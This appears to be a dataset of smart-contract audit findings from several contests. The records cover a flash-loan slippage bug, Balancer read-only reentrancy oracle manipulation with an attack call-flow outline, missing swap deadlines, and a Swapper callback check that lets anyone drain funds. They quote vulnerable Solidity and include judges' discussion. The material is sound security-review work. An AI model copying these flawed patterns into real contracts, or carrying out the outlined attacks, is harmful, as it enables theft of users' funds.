https://github.com/JOJOexchange/JUSDV1/commit/5918d68be9b5b021691f768da98df5f712ac6edd\nIAm0x52\nNeed validation of amount sent to `liquidated`\nIAm0x52\nFix looks good. Reentrancy exists if _primaryAsset is also a collateral but team has explicitly stated that this is never the case.чIn case of over liquidation, the liquidator does not need to pay additional USDC to the liquidatee\nCode Snippet\nTool used\nManual Review
FlashLoanLiquidate.JOJOFlashLoan has no slippage control when swapping USDCчmediumч"```\n    function JOJOFlashLoan(\n        address asset,\n        uint256 amount,\n        address to,\n        bytes calldata param\n    ) external {\n        (address approveTarget, address swapTarget, uint256 minReceive, bytes memory data) = abi\n            .decode(param, (address, address, uint256, bytes));\n        IERC20(asset).approve(approveTarget, amount);\n        (bool success, ) = swapTarget.call(data);\n        if (success == false) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n        require(USDCAmount >= minReceive, ""receive amount is too small"");\n// rest of code\n    function repayJUSD(\n        address asset,\n        uint256 amount,\n        address to,\n        bytes memory param\n    ) external {\n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 minReceive;\n        if (asset != USDC) {\n            (address approveTarget, address swapTarget, uint256 minAmount, bytes memory data) = abi\n                .decode(param, (address, address, uint256, bytes));\n            IERC20(asset).approve(approveTarget, amount);\n            (bool success, ) = swapTarget.call(data);\n            if (success == false) {\n                assembly {\n                    let ptr := mload(0x40)\n                    let size := returndatasize()\n                    returndatacopy(ptr, 0, size)\n                    revert(ptr, size)\n                }\n            }\n            minReceive = minAmount;\n        }\n\n        uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n        require(USDCAmount >= minReceive, ""receive amount is too small"");\n```\n"ч"FlashLoanLiquidate.JOJOFlashLoan has no slippage control when swapping USDC\nIn both GeneralRepay.repayJUSD and FlashLoanRepay.JOJOFlashLoan, the user-supplied minReceive parameter is used for slippage control when swapping USDC.\n```\n    function JOJOFlashLoan(\n        address asset,\n        uint256 amount,\n        address to,\n        bytes calldata param\n    ) external {\n        (address approveTarget, address swapTarget, uint256 minReceive, bytes memory data) = abi\n            .decode(param, (address, address, uint256, bytes));\n        IERC20(asset).approve(approveTarget, amount);\n        (bool success, ) = swapTarget.call(data);\n        if (success == false) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n        require(USDCAmount >= minReceive, ""receive amount is too small"");\n// rest of code\n    function repayJUSD(\n        address asset,\n        uint256 amount,\n        address to,\n        bytes memory param\n    ) external {\n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 minReceive;\n        if (asset != USDC) {\n            (address approveTarget, address swapTarget, uint256 minAmount, bytes memory data) = abi\n                .decode(param, (address, address, uint256, bytes));\n            IERC20(asset).approve(approveTarget, amount);\n            (bool success, ) = swapTarget.call(data);\n            if (success == false) {\n                assembly {\n                    let ptr := mload(0x40)\n                    let size := returndatasize()\n                    returndatacopy(ptr, 0, size)\n                    revert(ptr, size)\n                }\n            }\n            minReceive = minAmount;\n        }\n\n        uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n        require(USDCAmount >= minReceive, ""receive amount is too small"");\n```\n\nHowever, this is not done in FlashLoanLiquidate.JOJOFlashLoan, and the lack of slippage control may expose the user to sandwich attacks when swapping USDC."чConsider making FlashLoanLiquidate.JOJOFlashLoan use the minReceive parameter for slippage control when swapping USDC.\nDiscussion\nJoscelynFarr\nfix link: https://github.com/JOJOexchange/JUSDV1/commit/b0e7d27cf484d9406a267a1b38ac253113101e8e\nIAm0x52\nFix looks good. JOJOFlashloan now validates minReceived when swappingчThe lack of slippage control may expose the user to sandwich attacks when swapping USDC.\nCode Snippet\nTool used\nManual Review
Certain ERC20 token does not return bool from approve and transfer and transaction revertчmediumч```\n   function setApprovalForERC20(\n        IERC20 erc20Contract,\n        address to,\n        uint256 amount\n    ) external onlyClubOwner {\n        erc20Contract.approve(to, amount);\n    }\n```\nчCertain ERC20 token does not return bool from approve and transfer and transaction revert\nAccording to\nhttps://github.com/d-xo/weird-erc20#missing-return-values\nSome tokens do not return a bool on ERC20 methods and use IERC20 token interface will revert transaction\nCertain ERC20 token does not return bool from approve and transfer and transaction revert\n```\n   function setApprovalForERC20(\n        IERC20 erc20Contract,\n        address to,\n        uint256 amount\n    ) external onlyClubOwner {\n        erc20Contract.approve(to, amount);\n    }\n```\n\nand\n```\nfunction transferERC20(\n IERC20 erc20Contract,\n address to,\n uint256 amount\n) external onlyClubOwner {\n erc20Contract.transfer(to, amount);\n}\n```\n\nthe transfer / approve can fail slienltyч
`BalancerPairOracle` can be manipulated using read-only reentrancyчhighч```\nAttackerContract.flashLoan() ->\n    // Borrow lots of tokens and trigger a callback.\n    SomeProtocol.flashLoan() ->\n        AttackerContract.exploit()\n\nAttackerContract.exploit() ->\n    // Join a Balancer Pool using the borrowed tokens and send some ETH along with the call.\n    BalancerVault.joinPool() ->\n        // The Vault will return the excess ETH to the sender, which will reenter this contract.\n        // At this point in the execution, the BPT supply has been updated but the token balances have not.\n        AttackerContract.receive()\n\nAttackerContract.receive() ->\n    // Liquidate a position using the same Balancer Pool as collateral.\n    BlueBerryBank.liquidate() ->\n        // Call to the oracle to check the price.\n        BalancerPairOracle.getPrice() ->\n            // Query the token balances. At this point in the execution, these have not been updated (see above).\n            // So, the balances are still the same as before the start of the large pool join.\n            BalancerVaul.getPoolTokens()\n\n            // Query the BPT supply. At this point in the execution, the supply has already been updated (see above).\n            // So, it includes the latest large pool join, and as such the BPT supply has grown by a large amount.\n            BalancerPool.getTotalSupply()\n\n            // Now the price is computed using both balances and supply, and the result is much smaller than it should be.\n            price = f(balances) / pool.totalSupply()\n\n        // The position is liquidated under false pretenses.\n```\nч`BalancerPairOracle.getPrice` makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. As a result, the oracle can be trivially manipulated to liquidate user positions prematurely.\nIn February, the Balancer team disclosed a read-only reentrancy vulnerability in the Balancer Vault. The detailed disclosure can be found here. In short, all Balancer pools are susceptible to manipulation of their external queries, and all integrations must now take an extra step of precaution when consuming data. Via reentrancy, an attacker can force token balances and BPT supply to be out of sync, creating very inaccurate BPT prices.\nSome protocols, such as Sentiment, remained unaware of this issue for a few months and were later hacked as a result.\n`BalancerPairOracle.getPrice` makes a price calculation of the form `f(balances) / pool.totalSupply()`, so it is clearly vulnerable to synchronization issues between the two data points. A rough outline of the attack might look like this:\n```\nAttackerContract.flashLoan() ->\n    // Borrow lots of tokens and trigger a callback.\n    SomeProtocol.flashLoan() ->\n        AttackerContract.exploit()\n\nAttackerContract.exploit() ->\n    // Join a Balancer Pool using the borrowed tokens and send some ETH along with the call.\n    BalancerVault.joinPool() ->\n        // The Vault will return the excess ETH to the sender, which will reenter this contract.\n        // At this point in the execution, the BPT supply has been updated but the token balances have not.\n        AttackerContract.receive()\n\nAttackerContract.receive() ->\n    // Liquidate a position using the same Balancer Pool as collateral.\n    BlueBerryBank.liquidate() ->\n        // Call to the oracle to check the price.\n        BalancerPairOracle.getPrice() ->\n            // Query the token balances. At this point in the execution, these have not been updated (see above).\n            // So, the balances are still the same as before the start of the large pool join.\n            BalancerVaul.getPoolTokens()\n\n            // Query the BPT supply. At this point in the execution, the supply has already been updated (see above).\n            // So, it includes the latest large pool join, and as such the BPT supply has grown by a large amount.\n            BalancerPool.getTotalSupply()\n\n            // Now the price is computed using both balances and supply, and the result is much smaller than it should be.\n            price = f(balances) / pool.totalSupply()\n\n        // The position is liquidated under false pretenses.\n```\nч
Deadline check is not effective, allowing outdated slippage and allow pending transaction to be unexpected executedчhighч```\n{\n // 2. Swap rewards tokens to debt token\n uint256 rewards = _doCutRewardsFee(CRV);\n _ensureApprove(CRV, address(swapRouter), rewards);\n swapRouter.swapExactTokensForTokens(\n  rewards,\n  0,\n  swapPath,\n  address(this),\n  type(uint256).max\n );\n}\n```\nчDeadline check is not effective, allowing outdated slippage and allow pending transaction to be unexpected executed\n```\n{\n // 2. Swap rewards tokens to debt token\n uint256 rewards = _doCutRewardsFee(CRV);\n _ensureApprove(CRV, address(swapRouter), rewards);\n swapRouter.swapExactTokensForTokens(\n  rewards,\n  0,\n  swapPath,\n  address(this),\n  type(uint256).max\n );\n}\n```\n\nthe deadline check is set to type(uint256).max, which means the deadline check is disabled!\nIn IChiSpell. the swap is directedly call on the pool instead of the router\n```\nSWAP_POOL.swap(\n address(this),\n // if withdraw token is Token0, then swap token1 -> token0 (false)\n !isTokenA,\n amountToSwap.toInt256(),\n isTokenA\n  ? param.sqrtRatioLimit + deltaSqrt\n  : param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n abi.encode(address(this))\n);\n```\n\nand it has no deadline check for the transaction when swappingчWe recommend the protocol use block.timstamp for swapping deadline for Uniswap V2 and swap with Unsiwap Router V3 instead of the pool directly!чAMMs provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see Uniswap V2 and Uniswap V3). If such an option is not present, users can unknowingly perform bad trades:\nAlice wants to swap 100 tokens for 1 ETH and later sell the 1 ETH for 1000 DAI.\nThe transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\nWhen the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of ETH could have drastically changed. She will still get 1 ETH but the DAI value of that output might be significantly lower.\nShe has unknowingly performed a bad trade due to the pending transaction she forgot about.\nAn even worse way this issue can be maliciously exploited is through MEV:\nThe swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it.\nThe price of tokens has gone up significantly since the transaction was signed, meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her maximum slippage value (sqrtPriceLimitX96 and minOut in terms of the Spell contracts) is outdated and would allow for significant slippage.\nA MEV bot detects the pending transaction. Since the outdated maximum slippage value now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\nCode Snippet\nTool used\nManual Review
AuraSpell openPositionFarm does not join poolчmediumч"```\n    function openPositionFarm(\n        OpenPosParam calldata param\n    )\n        external\n        existingStrategy(param.strategyId)\n        existingCollateral(param.strategyId, param.collToken)\n    {\n        // rest of code\n        // 1. Deposit isolated collaterals on Blueberry Money Market\n        _doLend(param.collToken, param.collAmount);\n\n        // 2. Borrow specific amounts\n        uint256 borrowBalance = _doBorrow(\n            param.borrowToken,\n            param.borrowAmount\n        );\n\n        // 3. Add liquidity on Balancer, get BPT\n        {\n            IBalancerVault vault = wAuraPools.getVault(lpToken);\n            _ensureApprove(param.borrowToken, address(vault), borrowBalance);\n\n            (address[] memory tokens, uint256[] memory balances, ) = wAuraPools\n                .getPoolTokens(lpToken);\n            uint[] memory maxAmountsIn = new uint[](2);\n            maxAmountsIn[0] = IERC20(tokens[0]).balanceOf(address(this));\n            maxAmountsIn[1] = IERC20(tokens[1]).balanceOf(address(this));\n\n            uint totalLPSupply = IBalancerPool(lpToken).totalSupply();\n            // compute in reverse order of how Balancer's `joinPool` computes tokenAmountIn\n            uint poolAmountFromA = (maxAmountsIn[0] * totalLPSupply) /\n                balances[0];\n            uint poolAmountFromB = (maxAmountsIn[1] * totalLPSupply) /\n                balances[1];\n            uint poolAmountOut = poolAmountFromA > poolAmountFromB\n                ? poolAmountFromB\n                : poolAmountFromA;\n\n            bytes32 poolId = bytes32(param.farmingPoolId);\n            if (poolAmountOut > 0) {\n                vault.joinPool(\n                    poolId,\n                    address(this),\n                    address(this),\n                    IBalancerVault.JoinPoolRequest(\n                        tokens,\n                        maxAmountsIn,\n                        """",\n                        false\n                    )\n                );\n            }\n        }\n        // rest of code\n    }\n```\n"ч"The function to open a position for the AuraSpell does not join the pool due to wrong conditional check.\nThe function deposits collateral into the bank, borrow tokens, and attempts to join the pool:\n```\n    function openPositionFarm(\n        OpenPosParam calldata param\n    )\n        external\n        existingStrategy(param.strategyId)\n        existingCollateral(param.strategyId, param.collToken)\n    {\n        // rest of code\n        // 1. Deposit isolated collaterals on Blueberry Money Market\n        _doLend(param.collToken, param.collAmount);\n\n        // 2. Borrow specific amounts\n        uint256 borrowBalance = _doBorrow(\n            param.borrowToken,\n            param.borrowAmount\n        );\n\n        // 3. Add liquidity on Balancer, get BPT\n        {\n            IBalancerVault vault = wAuraPools.getVault(lpToken);\n            _ensureApprove(param.borrowToken, address(vault), borrowBalance);\n\n            (address[] memory tokens, uint256[] memory balances, ) = wAuraPools\n                .getPoolTokens(lpToken);\n            uint[] memory maxAmountsIn = new uint[](2);\n            maxAmountsIn[0] = IERC20(tokens[0]).balanceOf(address(this));\n            maxAmountsIn[1] = IERC20(tokens[1]).balanceOf(address(this));\n\n            uint totalLPSupply = IBalancerPool(lpToken).totalSupply();\n            // compute in reverse order of how Balancer's `joinPool` computes tokenAmountIn\n            uint poolAmountFromA = (maxAmountsIn[0] * totalLPSupply) /\n                balances[0];\n            uint poolAmountFromB = (maxAmountsIn[1] * totalLPSupply) /\n                balances[1];\n            uint poolAmountOut = poolAmountFromA > poolAmountFromB\n                ? poolAmountFromB\n                : poolAmountFromA;\n\n            bytes32 poolId = bytes32(param.farmingPoolId);\n            if (poolAmountOut > 0) {\n                vault.joinPool(\n                    poolId,\n                    address(this),\n                    address(this),\n                    IBalancerVault.JoinPoolRequest(\n                        tokens,\n                        maxAmountsIn,\n                        """",\n                        false\n                    )\n                );\n            }\n        }\n        // rest of code\n    }\n```\n\nThe function only borrowed one type of tokens from the bank so the contract only owns one type of token. As a result one of the `maxAmountsIn` value is 0. Either `poolAmountFromA` or `poolAmountFromB` is 0 as a result of computation. `poolAmountOut` is the minimal value of `poolAmountFromA` and `poolAmountFromB`, it is 0. The following check `if (poolAmountOut > 0)` will always fail and the pool will never be joined."чIt is hard to tell the intent of the developer from this check. Maybe the issue is simply that `poolAmountOut` should be the sum or the max value out of `poolAmountFromA` and `poolAmountFromB` instead of the min.чThe rest of the function proceeds correctly without reverting. Users will think they joined the pool and are earning reward while they are not earning anything. This is a loss of funds to the user.\nCode Snippet\nTool used\nManual Review
The protocol will not be able to add liquidity on the curve with another token with a balance.чmediumч```\n // 3. Add liquidity on curve\n        _ensureApprove(param.borrowToken, pool, borrowBalance);\n        if (tokens.length == 2) {\n            uint256[2] memory suppliedAmts;\n            for (uint256 i = 0; i < 2; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 3) {\n            uint256[3] memory suppliedAmts;\n            for (uint256 i = 0; i < 3; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 4) {\n            uint256[4] memory suppliedAmts;\n            for (uint256 i = 0; i < 4; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        }\n```\nчThe `CurveSpell` protocol only ensure approve curve pool to spend its borrow token. Hence, it will not be able to add liquidity on the curve with another token with a balance.\nThe `openPositionFarm()` function enables user to open a leveraged position in a yield farming strategy by borrowing funds and using them to add liquidity to a Curve pool, while also taking into account certain risk management parameters such as maximum LTV and position size. When add liquidity on curve ,the protocol use the borrowed token and the collateral token, it checks the number of tokens in the pool and creates an array of the supplied token amounts to be passed to the add_liquidity function. Then the curve will transfer the tokens from the protocol and mint lp tokens to the protocol. However, the protocol only ensure approve curve pool to spend its borrow token. Hence, it will not be able to add liquidity on the curve with another token with a balance.\n```\n // 3. Add liquidity on curve\n        _ensureApprove(param.borrowToken, pool, borrowBalance);\n        if (tokens.length == 2) {\n            uint256[2] memory suppliedAmts;\n            for (uint256 i = 0; i < 2; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 3) {\n            uint256[3] memory suppliedAmts;\n            for (uint256 i = 0; i < 3; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 4) {\n            uint256[4] memory suppliedAmts;\n            for (uint256 i = 0; i < 4; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        }\n```\nчAllow the curve pool to spend tokens that have a balance in the protocol to add liquidityчThe protocol will not be able to add liquidity on the curve with another token with a balance.\nCode Snippet\nTool used\nManual Review
`getPositionRisk()` will return a wrong value of riskчmediumч```\n    function isLiquidatable(uint256 positionId) public view returns (bool) {\n        return\n            getPositionRisk(positionId) >=\n            banks[positions[positionId].underlyingToken].liqThreshold;\n    }\n```\nчIn order to interact with SPELL the users need to `lend()` some collateral which is known as Isolated Collateral and the SoftVault will deposit them into Compound protocol to generate some lending interest (to earn passive yield)\nto liquidate a position this function `isLiquidatable()` should return `true`\n```\n    function isLiquidatable(uint256 positionId) public view returns (bool) {\n        return\n            getPositionRisk(positionId) >=\n            banks[positions[positionId].underlyingToken].liqThreshold;\n    }\n```\n\nand it is subcall to `getPositionRisk()`\n```\n    function getPositionRisk(\n        uint256 positionId\n    ) public view returns (uint256 risk) {\n        uint256 pv = getPositionValue(positionId);          \n        uint256 ov = getDebtValue(positionId);             \n        uint256 cv = getIsolatedCollateralValue(positionId);\n\n        if (\n            (cv == 0 && pv == 0 && ov == 0) || pv >= ov // Closed position or Overcollateralized position\n        ) {\n            risk = 0;\n        } else if (cv == 0) {\n            // Sth bad happened to isolated underlying token\n            risk = Constants.DENOMINATOR;\n        } else {\n            risk = ((ov - pv) * Constants.DENOMINATOR) / cv;\n        }\n    }\n```\n\nas we can see the `cv` is a critical value in terms of the calculation of `risk` the `cv` is returned by `getIsolatedCollateralValue()`\n```\n    function getIsolatedCollateralValue(\n        uint256 positionId\n    ) public view override returns (uint256 icollValue) {\n        Position memory pos = positions[positionId];\n        // NOTE: exchangeRateStored has 18 decimals.\n        uint256 underlyingAmount;\n        if (_isSoftVault(pos.underlyingToken)) {\n            underlyingAmount =                                              \n                (ICErc20(banks[pos.debtToken].bToken).exchangeRateStored() * \n                    pos.underlyingVaultShare) /\n                Constants.PRICE_PRECISION; \n        } else {\n            underlyingAmount = pos.underlyingVaultShare;\n        }\n        icollValue = oracle.getTokenValue(\n            pos.underlyingToken,\n            underlyingAmount\n        );\n    }\n```\n\n```\nThis function does not accrue interest before calculating the exchange rate\n```\n\nso the `getPositionRisk()` will return a wrong value of risk because the interest does not accrue for this positionчYou shoud use `exchangeRateCurrent()` to Accrue interest first.\nDiscussion\nGornutz\nSince we are using a view function we are unable to use `exchangeRateCurrent()` we have to use `exchangeRateStored()`\nCh-301\nEscalate for 10 USDC\nThe sponsor confirms that. so the user could get liquidated even in case his position is still healthy. I believe the rules are clear on that He decided to not fix it but the risk still exists\nsherlock-admin\nEscalate for 10 USDC\nThe sponsor confirms that. so the user could get liquidated even in case his position is still healthy. I believe the rules are clear on that He decided to not fix it but the risk still exists\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nctf-sec\nCan be a valid medium\nhrishibhat\nEscalation accepted\nValid medium Although the difference in the interest accumulated here can be very low as it updates slowly, although this cannot be exactly quantified, the fact that a position can be liquidated based on outdated value makes it a valid medium.\nsherlock-admin\nEscalation accepted\nValid medium Although the difference in the interest accumulated here can be very low as it updates slowly, although this cannot be exactly quantified, the fact that a position can be liquidated based on outdated value makes it a valid medium.\n```\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n```\nчthe user (position) could get liquidated even if his position is still healthy\nCode Snippet\n```\n    /**\n     * @notice Accrue interest then return the up-to-date exchange rate\n     * @return Calculated exchange rate scaled by 1e18\n     */\n    function exchangeRateCurrent() override public nonReentrant returns (uint) {\n        accrueInterest();\n        return exchangeRateStored();\n    }\n\n    /**\n     * @notice Calculates the exchange rate from the underlying to the CToken\n     * @dev This function does not accrue interest before calculating the exchange rate\n     * @return Calculated exchange rate scaled by 1e18\n     */\n    function exchangeRateStored() override public view returns (uint) {\n        return exchangeRateStoredInternal();\n    }\n```\n\nTool used\nManual Review
asking for the wrong address for `balanceOf()`чmediumч```\n        // 5. Put collateral - strategy token\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n```\nчShortLongSpell.openPosition() pass to `_doPutCollateral()` wrong value of `balanceOf()`\n```\n        // 5. Put collateral - strategy token\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n```\n\nthe balance should be of `address(vault)`ч
SwapperCallbackValidation doesn't do anything, opens up users to having contracts drainedчmediumч```\nfunction verifyCallback(SwapperFactory factory_, SwapperImpl swapper_) internal view returns (bool valid) {\n    return factory_.isSwapper(swapper_);\n}\n```\nчThe `SwapperCallbackValidation` library that is intended to be used by contracts performing swaps does not provide any protection. As a result, all functions intended to be used only in a callback setting can be called any time by any user. In the provided example of how they expect this library to be used, this would result in the opportunity for all funds to be stolen.\nThe `SwapperCallbackValidation` library is intended to be used by developers to verify that their contracts are only called in a valid, swapper callback scenario. It contains the following function to be implemented:\n```\nfunction verifyCallback(SwapperFactory factory_, SwapperImpl swapper_) internal view returns (bool valid) {\n    return factory_.isSwapper(swapper_);\n}\n```\n\nThis function simply pings the `SwapperFactory` and confirms that the function call is coming from a verified swapper. If it is, we assume that it is from a legitimate callback.\nFor an example of how this is used, see the (out of scope) UniV3Swap contract, which serves as a model for developers to build contracts to support Swappers.\n```\nSwapperImpl swapper = SwapperImpl(msg.sender);\nif (!swapperFactory.verifyCallback(swapper)) {\n    revert Unauthorized();\n}\n```\n\nThe contract goes on to perform swaps (which can be skipped by passing empty exactInputParams), and then sends all its ETH (or ERC20s) to `msg.sender`. Clearly, this validation is very important to protect such a contract from losing funds.\nHowever, if we look deeper, we can see that this validation is not nearly sufficient.\nIn fact, `SwapperImpl` inherits from `WalletImpl`, which contains the following function:\n```\nfunction execCalls(Call[] calldata calls_)\n    external\n    payable\n    onlyOwner\n    returns (uint256 blockNumber, bytes[] memory returnData)\n{\n    blockNumber = block.number;\n    uint256 length = calls_.length;\n    returnData = new bytes[](length);\n\n    bool success;\n    for (uint256 i; i < length;) {\n        Call calldata calli = calls_[i];\n        (success, returnData[i]) = calli.to.call{value: calli.value}(calli.data);\n        require(success, string(returnData[i]));\n\n        unchecked {\n            ++i;\n        }\n    }\n\n    emit ExecCalls(calls_);\n}\n```\n\nThis function allows the owner of the Swapper to perform arbitrary calls on its behalf.\nSince the verification only checks that the caller is, in fact, a Swapper, it is possible for any user to create a Swapper and pass arbitrary calldata into this `execCalls()` function, performing any transaction they would like and passing the `verifyCallback()` check.\nIn the generic case, this makes the `verifyCallback()` function useless, as any calldata that could be called without that function could similarly be called by deploying a Swapper and sending identical calldata through that Swapper.\nIn the specific case based on the example provided, this would allow a user to deploy a Swapper, call the `swapperFlashCallback()` function directly (not as a callback), and steal all the funds held by the contract.чI do not believe that Swappers require the ability to execute arbitrary calls, so should not inherit from WalletImpl.\nAlternatively, the verification checks performed by contracts accepting callbacks should be more substantial — specifically, they should store the Swapper they are interacting with's address for the duration of the transaction, and only allow callbacks from that specific address.\nDiscussion\nzobront\nFixed in https://github.com/0xSplits/splits-swapper/pull/3/ by removing the validation and requiring bots to either (a) not hold funds in the contract or (b) create their own validations.\nMLON33\nConfirming that Splits meant for this fix (3) to be linked to this issue (9):\nhttps://github.com/0xSplits/splits-swapper/pull/3#issue-1693205720чAll funds can be stolen from any contracts using the `SwapperCallbackValidation` library, because the `verifyCallback()` function provides no protection.\nCode Snippet\nTool used\nManual Review
Swapper mechanism cannot incentivize ETH-WETH swaps without risking owner fundsчmediumч```\namountsToBeneficiary = $oracle.getQuoteAmounts(quoteParams_);\n```\nчWhen `flash()` is called on the Swapper contract, pairs of tokens are passed in consisting of (a) a base token, which is currently held by the contract and (b) a quote token, which is the `$tokenToBeneficiary` that the owner would like to receive.\nThese pairs are passed to the oracle to get the quoted value of each of them:\n```\namountsToBeneficiary = $oracle.getQuoteAmounts(quoteParams_);\n```\n\n```\nConvertedQuotePair memory cqp = quoteParams_.quotePair._convert(_convertToken);\nSortedConvertedQuotePair memory scqp = cqp._sort();\n```\n\nThe oracle goes on to check for pair overrides, and gets the `scaledOfferFactor` for the pair being quoted:\n```\nPairOverride memory po = _getPairOverride(scqp);\nif (po.scaledOfferFactor == 0) {\n    po.scaledOfferFactor = $defaultScaledOfferFactor;\n}\n```\n\nThe `scaledOfferFactor` is the discount being offered through the Swapper to perform the swap. The assumption is that this will be set to a moderate amount (approximately 5%) to incentivize bots to perform the swaps, but will be overridden with a value of ~0% for the same tokens, to ensure that bots aren't paid for swaps they don't need to perform.\nThe problem is that these overrides are set on the `scqp` (sorted, converted tokens), not the actual token addresses. For this reason, ETH and WETH are considered identical in terms of overrides.\nTherefore, Swapper owners who want to be paid out in ETH (ie where $tokenToBeneficiary = ETH) have two options:\nThey can set the WETH-WETH override to 0%, which successfully stops bots from earning a fee on ETH-ETH trades, but will not provide any incentive for bots to swap WETH in the swapper into ETH. This makes the Swapper useless for WETH.\nThey can keep the WETH-WETH pair at the original ~5%, which will incentivize WETH-ETH swaps, but will also pay 5% to bots for doing nothing when they take ETH out of the contract and return ETH. This makes the Swapper waste user funds.\nThe same issues exist going in the other direction, when `$tokenToBeneficiary = WETH`.чThe `scaledOfferFactor` (along with its overrides) should be stored on the Swapper, not on the Oracle.\nIn order to keep the system modular and logically organized, the Oracle should always return the accurate price for the `scqp`. Then, it is the job of the Swapper to determine what discount is offered for which asset.\nThis will allow values to be stored in the actual `base` and `quote` assets being used, and not in their converted, sorted counterparts.\nDiscussion\nzobront\nFixed in https://github.com/0xSplits/splits-swapper/pull/4/files by replacing the `_convertToken` function used by the Swapper to be the identity function, leaving ETH as ETH instead of converting to WETH.\njacksanford1\nConfirming that Splits meant for this fix (4) to link to this issue (60): https://github.com/0xSplits/splits-swapper/pull/4#issue-1696988978\nsecuritygrid\nEscalate for 10 USDC I also noticed this issue. I didn't submit it because I thought the swapper owner would go bankrupt if he allowed such trading pairs with a discount. This is misconfiguration. In README.MD: Q: Please list any known issues/acceptable risks that should not result in a valid finding. user misconfiguration; swapper#flash callers are expected to be sophisticated (aka will check if a given txn reverts, will use flashbots rpc to avoid FR & owner-griefing, etc) So, this is not a valid H/M.\nsherlock-admin\nEscalate for 10 USDC I also noticed this issue. I didn't submit it because I thought the swapper owner would go bankrupt if he allowed such trading pairs with a discount. This is misconfiguration. In README.MD: Q: Please list any known issues/acceptable risks that should not result in a valid finding. user misconfiguration; swapper#flash callers are expected to be sophisticated (aka will check if a given txn reverts, will use flashbots rpc to avoid FR & owner-griefing, etc) So, this is not a valid H/M.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation rejected\nValid medium This is not a user misconfiguration, the issue here is that the pair overrides do not work as the system intended for ETH-WETH swaps regardless of the user input. So the complexity of the user does not matter here but is about the absent configuration for a pair.\nsherlock-admin\nEscalation rejected\nValid medium This is not a user misconfiguration, the issue here is that the pair overrides do not work as the system intended for ETH-WETH swaps regardless of the user input. So the complexity of the user does not matter here but is about the absent configuration for a pair.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чUsers who want to be paid out in ETH or WETH will be forced to either (a) have the Swapper not function properly for a key pair or (b) pay bots to perform useless actions.\nCode Snippet\nTool used\nManual Review
CollateralManager#commitCollateral overwrites collateralInfo._amount if called with an existing collateralчhighч```\nfunction _commitCollateral(\n    uint256 _bidId,\n    Collateral memory _collateralInfo\n) internal virtual {\n    CollateralInfo storage collateral = _bidCollaterals[_bidId];\n    collateral.collateralAddresses.add(_collateralInfo._collateralAddress);\n    collateral.collateralInfo[\n        _collateralInfo._collateralAddress\n    ] = _collateralInfo; <- @audit-issue collateral info overwritten\n    emit CollateralCommitted(\n        _bidId,\n        _collateralInfo._collateralType,\n        _collateralInfo._collateralAddress,\n        _collateralInfo._amount,\n        _collateralInfo._tokenId\n    );\n}\n```\nч"When duplicate collateral is committed, the collateral amount is overwritten with the new value. This allows borrowers to front-run bid acceptance to change their collateral and steal from lenders.\n```\nfunction _commitCollateral(\n    uint256 _bidId,\n    Collateral memory _collateralInfo\n) internal virtual {\n    CollateralInfo storage collateral = _bidCollaterals[_bidId];\n    collateral.collateralAddresses.add(_collateralInfo._collateralAddress);\n    collateral.collateralInfo[\n        _collateralInfo._collateralAddress\n    ] = _collateralInfo; <- @audit-issue collateral info overwritten\n    emit CollateralCommitted(\n        _bidId,\n        _collateralInfo._collateralType,\n        _collateralInfo._collateralAddress,\n        